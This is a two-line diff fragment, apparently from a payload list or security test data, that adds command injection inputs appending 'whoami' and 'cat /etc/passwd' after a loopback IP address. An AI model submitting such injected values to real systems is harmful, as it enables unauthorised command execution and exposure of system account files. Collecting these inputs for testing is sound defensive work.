@@ -1,0 +1,2 @@
+Payload: 127.0.0.1; whoami
+Payload: 127.0.0.1; cat /etc/passwd
